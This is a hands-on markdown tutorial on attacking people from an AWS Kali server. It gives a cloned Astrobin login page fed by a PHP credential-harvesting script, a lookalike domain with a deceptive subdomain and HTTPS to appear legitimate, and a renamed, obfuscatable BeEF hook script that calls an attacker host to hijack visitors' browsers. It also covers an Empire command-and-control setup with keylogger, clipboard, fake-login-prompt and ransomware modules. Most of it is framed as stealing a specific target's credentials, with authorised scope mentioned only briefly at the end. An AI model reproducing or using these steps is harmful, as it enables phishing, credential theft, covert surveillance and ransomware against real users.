# Hacking Using the Cloud

For more information about the cloud, please take a look at my notes on [cloud foundations](https://github.com/puzz00/cloud-foundations/blob/main/cloud-foundations.md)

>[!NOTE]
>In order for the attacks in these notes to work the target will need to be *socially engineered* into clicking on links or inputting data - this is not covered here but I will be adding a repo on it in the - hopefully - near future...

This set of notes will focus specifically on *using* the cloud to help us with our hacking activities.

## Cloud Basics

There are lots of cloud providers but since Amazon AWS is the most popular one, it lets us set up a kali linux attacking machine easily and it offers free resources, we will be using this provider in these notes.

We can have access to some AWS resources free for one year.

### Signing Up with AWS

>[!NOTE]
>We do need to provide credit card details when signing up to AWS even for using free resources

We need to visit the sign up page for AWS and provide a valid email address along with a username.

![sign up](/images/1.png)

During the process we need to choose a *support plan* - the free one is fine so we can choose it.

![sign up 2](/images/2.png)

### Installing Kali Linux with AWS

We will install an instance of kali linux on an AWS *elastic computer* aka *ec2* so we can use it as an attacking machine on the cloud.

First of all, we need to find the *Build a solution* part of the AWS home console page. We can then *Launch a virtual machine*

![ec2 3](/images/3.png)

We can then search for *kali* and when we look in the *AWS Marketplace AMIs* tab we will find the latest image for kali linux which we can then select.

![ec2 4](/images/4.png)

Once we have selected the kali linux AMI we can choose the instance type - there should be one or two which are available to the free tier so we can choose whichever one of these offers us the most resources - number of cpus and memory.

![ec2 5](/images/5.png)

We then need to create a *keypair* so we can access the instance using SSH - the *public* key will be saved to the remote kali machine whilst the *private* key will be downloaded to our local machine.

![ec2 6](/images/6.png)

The network settings can be left as they are at default values but we might be able to increase the amount of storage we have - check what the maximum amount is for the free tier and then set the amount you want to be the same as it - at the time of writing these notes that is 30GB

We can then launch the instance by clicking on the *Launch instance* button.

![ec 7](/images/7.png)

### Connecting to the Remote Machine using SSH

We need to first of all change the permissions of the *private* key which was downloaded to our local machine during the process of creating an instance of kali linux in the cloud.

```bash
chmod 700 kali_keypair.pem
```

We can now use this key along with SSH to connect to the remote kali machine - we will need to specify its public IP address which is visible in the AWS console.

```bash
sudo ssh -i kali_keypair.pem kali@11.22.33.44
```

We now have an instance of kali linux up and running from the cloud - we can access it via SSH from our local machine and we can therefore start to use it to help us with our hacking activities :smiling_imp: 

## Basic Phishing

We can replicate any websites login page and then serve our fake page from our cloud computer. We can then socially engineer people into entering their credentials on our fake page so we can steal them - this is the essence of phishing.

### Getting Started

Before creating a phishing webpage, we need to make sure that we have a web server on our remote machine - it might not have *apache2* installed on it by default. We can check this using: `which apache2` and if no service with this name is found we can update the repositories and then install apache2 along with php like so:

```bash
sudo apt-get update
sudo apt install apache2 php
```

We will then need to start the apache2 web server using: `sudo service apache2 start`

Next, we will need to add a new rule to our remote machines security group to allow inbound connections on port 80.

![phishing1](/images/8.png)

![phishing2](/images/9.png)

Once we have added this new rule our web root will be on the internet - we can use this to host our malicious webpages and apps.

### Cloning Websites

We can clone a webpage by simply navigating to it and then right clicking on it before selecting `Save Page As` We can then create a local copy of the source code of the webpage we want to use as a base for our phishing page. In this example, we are going to use *Astrobin*

If this does not work - sometimes the webpage renders in a weird way - we can use `httrack` to download the resources we need.

The easiest way to use this tool is to just run it and then after specifying an output directory for the downloaded resources we can continue by selecting to mirror the website using the wizard - this is currently option 2 - the default options can be left the same.

>[!NOTE]
>This tool will take a variable amount of time to mirror the website - it can be very quick but for larger sites it can take a while

#### Using Filezilla for File Transfers

We can use Filezilla to interact with our remote kali machine via a GUI which makes it easier to transfer and work with files. We can use SSH with Filezilla so our data is still secure.

We can use our package manager to install Filezilla:

```bash
sudo apt-get update
sudo apt install filezilla
```

We can then connect to the remote kali machine via Filezilla.

![phishing2](/images/10.png)

>[!IMPORTANT]
>We need to use `sudo chown kali:kali /var/www/html -R` via SSH to change the ownership of the web root on the remote kali machine before we can transfer files to it

We can now transfer the mirrored website files to our remote kali machine by simply dragging and dropping them into `/var/www/html` from within Filezilla.

>[!NOTE]
>Make sure `index.html` is copied across to the web root and the default apache2 `index.html` page has been deleted

![phishing3](/images/11.png)

Once we have completed all of the above steps we can test if it has worked by navigating to the IP address of our kali machine in the cloud - we should see a replica of the login page we are using for our phishing endeavours :fishing_pole_and_fish: 

![phishing4](/images/12.png)

### Amending Source Code

Before we continue with getting the domain name and https certificate sorted, we need to edit the source code of the fake login page so it harvests credentials which are entered on it.

We can first of all open the page in a browser and use the *dev tools* to look for the *login form* - we can use the *inspector* tool to easily do this.

>[!NOTE]
>In HTML a `<form></form>` element wraps all the form input together - we will find the username and password input fields inside a *form* element

Once we have found the correct login form, we need to check for any *id* parameters which may have been set on the form element itself or the button element which submits the entered data. If we find any *id* parameters on these elements we just need to delete them since they can be used by code elsewhere to mess up our phishing attempts.

We can then find the `action=` parameter and change it so it navigates to a malicious PHP script which will harvest the credentials.

>[!NOTE]
>The `action` parameter specifies what should happen to the input data once the submit button has been clicked - we want it to send the data to a malicious PHP script.

![source code 1](/images/30.png)

We can now create the malicioius PHP script:

```php
<?php

$username = $_POST["auth-username"];
$password = $_POST["auth-password"];

$myfile = fopen("data/data.txt", "a+") or die("Unable to open file!");

$txt = "\nUsername: " . $username . "\nPassword: " . $password;
fwrite($myfile, $txt);
fclose($myfile);

header('Location: https://www.astrobin.com/users/Astro_Backyard/');
?>
```

In the above code, we use the values given in the original login page source code for the `name` parameter in the `<input>` elements for the username and password - in this case these are `auth-username` and `auth-password` respectively but will be different for different websites - just check the source code of the page you are copying.

We also add a redirect to a legitimate part of the website we are using to help with our phishing activities to make the attack less suspicious - we do this by adding a `Location` header.

![source code 2](/images/31.png)

### Sorting the Domain Name

With the malicious PHP script in place and the `action` paramater on the login form sending the user supplied data to it, we can turn our attention to making the URL look more legitimate.

>[!NOTE]
>Lots of phishing campaigns work even though random domain names are used as some people do not check the URL carefully - we will have more success if we pay attention to this part, though :smiley: 

There are lots of *registrars* - they will sell us domain names. In this example we are using [name.com](https://name.com)

We can search for domain names which are in some way similar to the site we are using for our phishing endeavour. The closer we can get to the original the better - this is a great opportunity to be creative and enjoy the social engineering side of things.

In this example, we are imagining that for some reason we want to access the astrobin account of the target who is intereseted in astrophotography.

Maybe we want to find out more about them and their contacts. Maybe we want to search for other details - astrophotographers probably want to link their work on astrobin to instagram or other social media sites - perhaps we could find data relating to these other accounts on their astrobin account. Or maybe we just want credentials so we can try them elsewhere since password reuse is still rife. Either way, we are attacking their astrobin account and we assume or know that they know about the work of Trevor Jones from [astrobackyard.com](https://astrobackyard.com) so we look for a domain name which is related to this site.

The domain `astro-backyard.space` is available and even with enhanced privacy included - this keeps our details out of the public domain so people cannot find them using `whois` - the cost is less than 15 euros for a year - cheaper options were available but this one seems good.

![domain 1](/images/13.png)

Even though this seems suspicious :detective: as it is clearly not `astrobin.com` there is a method to the madness  - our plan is to add a subdomain which will be `astrobin` which will make it look like Trevor Jones has set up a new gallery or page which is accessed via astrobin.

>[!TIP]
>For popular site like `facebook.com` all similar domain names were taken long ago - we can use generic login domain names for sites like this - `loginportal` for example - and then add a `facebook` subdomain to make it look more authentic - `facebook.loginportal.cloud` for example.

Once we have purchased a domain name, we need to set up a DNS `A` record which will link the domain name to the *public* IP address of our cloud server.

![dns1](/images/14.png)

Setting up an `A` record is very easy.

![dns2](/images/15.png)

It can take anywhere from about one minute to just under five billion years for DNS records to update. It is usually done in a few minutes, though, so we can check to see if things are working as expected after a short amount of time - do not worry if not - just give it time.

![dns3](/images/16.png)

We can now create another DNS record for our subdomain - this one will be a `CNAME` record which is essentialy an alias. We will point `astrobin.astro-backyard.space` to `astro-backyard.space` which in turn is linked to the public IP address of the cloud server.

![dns4](/images/17.png)

After a few ~~billion years~~ minutes, we can check and when it works it looks much more authentic - the problem of it not being 'secure' will be addressed soon...

![dns5](/images/18.png)

### Getting a Certificate for https

Let us now get rid of that nasty warning about how the site ahead is not secure and naughty people :vampire: might be trying to steal your details. Browsers display this whenever an `http` site - such as ours - is requested.

We need to get a certificate.

We can do this using `certbot` which is installable on kali linux using the `apt` package manager. We can also install `python3-certbot-apache`

![https1](/images/19.png)

![https2](/images/20.png)

We need to install these on the cloud server which is registered for the domain name since the verification of ownership checks will fail if we request the certificate from a different machine.

```bash
sudo certbot --apache
```

![https3](/images/21.png)

We then need to add a new security rule for inbound traffic on port 443 as https uses port 443.

![https4](/images/22.png)

The phishing site now looks a lot better since we do not get any warnings and there is a padlock displayed which reassures lots of people :thumbsup: 

![https5](/images/23.png)

We can add new domains and subdomains to an existing certificate using:

```bash
sudo certbot certonly -d astro-backyard.space -d astrobin.astroback-yard.space
```

![https6](/images/24.png)

Our phishing site for this example is now complete - in my opinion it looks good and it definitely is effective when it comes to harvesting credentials.

![success1](/images/25.png)

![success2](/images/26.png)

![success3](/images/28.png)

Okay, so the target is not actually logged into the website, but lots of people will consider this to be a glitch in the matrix :dark_sunglasses: and either way we have already harvested their credentials. The redirect we added to our PHP code helps dampen down suspicion, too.

![success4](/images/27.png)

## Bypassing Two Factor Authentication

Atrobin does not enforce Two Factor Authentication - 2FA - by default so it could well be that once we have harvested the credentials of the target we will be able to login directly as them. However, some websites - github for example - do enforce it if there is a login from an unrecognised device.

This raises the next problem - how can we get around 2FA?

In this example, we are going to use a *browser-in-browser* attack...

### Accessing the Cloud Server Desktop

Even though this might not at first appear to have anything to do with bypassing 2FA it does indeed need to be done as a starting point.

We can install a Graphical User Interface along with a VNC server on the cloud server and a VNC client on our local machine to interact graphically with the cloud server.

>[!NOTE]
>Will come back to finish this section on a browser-in-browser attack later...

## Hacking Web Browsers

We can hack browsers by embedding malicious javascript into our phishing pages.

Javascript works on all modern web-browsers as it is used by developers to make websites interactive. It is a client side language which means it works on the client machine. Most people have javascript enabled on their web browser, so we can take advantage of this to hack their browsers.

>[!NOTE]
>It is possible to disable javascript in browser settings - if this is done then the attacks in this section will not work - most people never disable it though so the attacks will work in most cases

### Installing BEEF

Beef is a web browser exploitation framework. We can install it on kali using `sudo apt install beef-xss`

Once we have installed it we will need to change the default password otherwise it will not start. We can edit the default credentials by opening `/etc/beef-xss/config.yaml` as root.

![beef1](/images/55.png)

We can then start beef using `sudo beef-xss start`

![beef2](/images/56.png)

In order for victim browsers to connect to our malicious server which is running beef on the cloud we will need to open inbound connections for port 3000 since this is the port which beef runs on.

![beef3](/images/57.png)

We can now navigate to the beef login page from any machine connected to the internet. The login page is found on port 3000 at `/ui/panel`

![beef4](/images/58.png)

### Embedding Malicious Javascript

We need to *hook* a victim browser to beef before we can exploit it. In order to do this, we need to embed a line of malicious javascript into the source code of the malicious webpage.

A good place to insert this code is at the start of the `<head></head>` section.

![beef5](/images/59.png)

The line of code is:

```html
<script src="http://gaqzirkalewu.astro-backyard.space:3000/hook.js"></script>
```

>[!NOTE]
>In this example we are using a gibberish subdomain `gaqzirkalewu` for the domain earlier purchased `astro-backyard.space` so nobody inadvertently gets hooked

The `hook.js` file contains malicious javascript which hooks the victim browser to beef.

In its default form, the line of code is suspicious, so we can obfuscate it by renaming it and placing it into a directory on our cloud based web server. It is normal for javascript files to be placed into a directory called `/scripts` so this is where we place our malicious hook script - `/scripts/gallery.js` instead of `hook.js`

![beef6](/images/77.png)

This should mask the intention of the file to a casual observer of the source code - most people never look at it anyway - but to avoid more thorough examination if we suspect our page will be subject to it we can use javascript obfuscation techniques. I have detailed some simple ones in my repo about [javascript deobfuscation](https://github.com/puzz00/deobfuscation/blob/main/deobfuscation.md#basic-obfuscation)

We now need to socially engineer our target to visit the malicious webpage.

>[!NOTE]
>I will not go into detail about cloning the webpage and setting up a domain name for it as we covered this earlier in this repo

The beauty of this technique is that the target only needs to go to the malicious page in order for their browser to get hooked into beef - the webpage does not need to be a login page - it could be anything - a blog, a picture gallery, a shopping site etc.

As soon as the page loads, the javascript in the malicious file is loaded - providing javascript is enabled in the browser and it most often is - and we will see a new browser in our beef control panel on the cloud server.

![beef7](/images/60.png)

![beef8](/images/61.png)

Once we see an online hooked browser, we can click on it and see lots of detail regarding it in the *Details* section. We can then run commands on it from the *Commands* section.

![beef9](/images/62.png)

In this first example, we see that the browser has been successfully hooked because a simple prompt works.

![beef10](/images/63.png)

![beef11](/images/64.png)

### Enabling HTTPS

If we enable https on our malicious web page we will be able to run more intrusive commands on the victim browser since some of the commands will be prevented by the browser if there is no security certificate. The use of https also makes the webpage more believable.

Earlier, it was mentioned that we need to make a note of where the cert and key were downloaded by `certbot` - we now need these locations as we will copy the cert and the key into `/usr/share/beef-xss` which is where beef keeps certs and keys.

>[!TIP]
>If you didnt note the path to them you can use `sudo find / -iname *privkey* 2>/dev/null` to find the key and `sudo find / -iname *fullchain* 2>/dev/null` to find the cert.

We can then copy them to where they need to be:

```bash
sudo cp /etc/letsencrypt/live/gaqzirkalewu.astro-backyard.space/privkey.pem /usr/share/beef-xss

sudo cp /etc/letsencrypt/live/gaqzirkalewu.astro-backyard.space/fullchain.pem /usr/share/beef-xss
```

![beef12](/images/65.png)

We now need to make some amendments to the `/etc/beef-xss/config.yaml` file as shown in the pictures below.

![beef13](/images/66.png)

![beef14](/images/67.png)

We can now access the https version of the beef control panel.

![beef15](/images/68.png)

We need to change the source code of our malicious webpage so https is specified rather than http.

![beef16](/images/69.png)

The target will now see a padlock and https being used on our malicious webpage.

![beef17](/images/70.png)

### Exploiting the Browser

With https enabled, we can now run more intrusive commands. There are lots of things we can do once a browser has been hooked. We will look at some of them here but it is worthwhile reading over and testing others in the *Commands* section of beef.

#### Getting Location Data

We can already get a rough idea of where the target is from their IP address which we will see in the *Hooked Browsers* section. We can use an online IP location service to do this.

With https enabled, we can attempt to get an exact location of the target via geolocation. This will ask for permission from the victim via a pop-up. Social engineering once again comes into play - we will need the victim to allow access to their location via clever trickery.

![beef18](/images/71.png)

![beef19](/images/72.png)

We can run the `Webcam HTML5` command to attempt to access the victims webcam. Again, they will need to give permission via a pop-up.

![beef20](/images/73.png)

Regarding social engineering endeavours, there are lots of useful commands in beef to help us with these. A great one is `Pretty Theft` which lets us craft a simple `div` which will attempt to socially engineer the victim into sending credentials to us.

![beef21](/images/74.png)

![beef22](/images/75.png)

![beef23](/images/76.png)

### Conclusion

As we can see, hacking a web-browser can easily be achieved using malicious javascript. We could write our own, but it makes a lot more sense to use an exploitation framework such as beef.

The beauty of this technique is that the victim will not see anything unusual happening as they are hooked to beef and they only need to visit a poisoned page which they can be socially engineered into visiting.

Once a browser has been hooked to beef there are lots of ways we can exploit it - the commands covered here are but a few.

>[!TIP]
>We can run *watering hole* attacks with beef - we just put the hook into a phishing webpage which has been designed so people might inadvertently land on it via fat fingering URLs or other means - we can then attempt to harvest credentials such as the facebook ones given earlier in the `Pretty Theft` example
>If we find an *XSS* vulnerability - we can place our javascript beef hook onto a legitimate website via it
>We can even use our beef hook in a *honeypot* website which we have crafted

## Command and Control from the Cloud

In this section we will look at how we can install and use a *Command and Control* server on the cloud. We will be using [empire](https://github.com/BC-SECURITY/Empire) as it is open source and effective.

>[!NOTE]
>My repo on using [powershell for pentesting](https://github.com/puzz00/powershell-pentesting/blob/main/powershell-pentesting.md#powershell-empire) goes over using empire from the command line

We will be looking here at using the *starkiller* web interface since once it has been installed on our cloud server we will be able to easily access it from any device which is connected to the internet.

### Installation and Setting Empire Up

We can install empire from the [empire repo](https://github.com/BC-SECURITY/Empire) We first of all *clone* it.

![cc1](/images/80.png)

We then make the `/opt` directory owned by `kali` using `sudo chown kali:kali /opt` We will also need to give the `kali` user a password since one will be needed to install empire.

![cc2](/images/81.png)

We can now *clone* the repo to our server using `git clone --recursive https://github.com/BC-SECURITY/Empire.git`

>[!NOTE]
>It is common to install *optional* packages like empire into the `/opt` directory on a linux system

We can then navigate into the `/Empire/` directory and use `./setup/checkout-latest-tag.sh` to make sure that we have the latest stable version.

![cc3](/images/83.png)

We can now install empire using `./setup/install.sh` Once we have done this we can start the server using `sudo powershell-empire server`

![cc4](/images/84.png)

We then need to allow inbound traffic to port `1337` as empire uses this port.

![cc5](/images/85.png)

When we navigate to the `http://gaqzirkalewu.astro-backyard.space:1337/index.html` page we will find the login form. We need to change the Url field to match the domain name of our server. The default credentials are `empireadmin:password123`

![cc6](/images/86.png)

The first thing we need to do is set up a new user so we can disable the default user - this is being served on the cloud so anybody who accesses the login page could easily gain access to our hacked machines inside empire if the default user is still enabled - not a good day at the office :exploding_head: 

![cc7](/images/87.png)

![cc8](/images/88.png)

>[!NOTE]
>We can restrict which IP addresses or blocks have access to our cloud instances but it is never a good idea to leave default accounts with default credentials exposed to the internet

### Listeners, Stagers and Agents

For more detail about what these are, please see my repo on [powershell for pentesting](https://github.com/puzz00/powershell-pentesting/blob/main/powershell-pentesting.md#powershell-empire)

In the pictures below we see how we can create listeners and stagers using starkiller and what it looks like when an agent checks in.

![cc9](/images/89.png)

![cc10](/images/90.png)

![cc11](/images/91.png)

![cc12](/images/92.png)

### Interacting with an Agent

We can easily navigate the agents file system from starkiller - the pictures show how we can do this.

![cc13](/images/93.png)

![cc14](/images/94.png)

![cc15](/images/95.png)

### Running Modules

We can run modules on an agent using the starkiller interface.

![cc16](/images/96.png)

![cc17](/images/97.png)

![cc18](/images/98.png)

![cc19](/images/99.png)

![cc20](/images/100.png)

#### Phishing for Credentials

There is a good module we can use to phish for credentials to access a windows machine. It can lead to further access to an organizations network since if successful we will receive network creds.

The module is called `powershell_collection_toasted`

![cc21](/images/101.png)

![cc22](/images/102.png)

![cc23](/images/103.png)

![cc24](/images/104.png)

>[!TIP]
>Set the value for *verify creds* to *True* so the target will be continuously prompted to enter valid credentials if they enter incorrect ones

#### Keylogger and Clipboard Monitor Modules

If we want to log keystrokes - possibly to retrieve valid credentials - we can use `powershell_collection_keylogger` and if we suspect that the target is copying and pasting passwords into applications from a password manager we can monitor their clipboard contents using `powershell_collection_clipboard_monitor`

![cc25](/images/105.png)

![cc26](/images/106.png)

![cc27](/images/107.png)

![cc28](/images/108.png)

#### Simulating a Ransomware Attack

We might be tasked with testing the ransomware response of a client - we can do this from empire using the `powershell_exfiltration_psransom` module.

![cc29](/images/109.png)

![cc30](/images/110.png)

![cc31](/images/111.png)

>[!IMPORTANT]
>The *recovery key* is in the `readme` text file - this can be used with the same module set to *decrypt* to recover the clients files - be careful with this module - test it and make sure you have the scope to use it if it works as expected
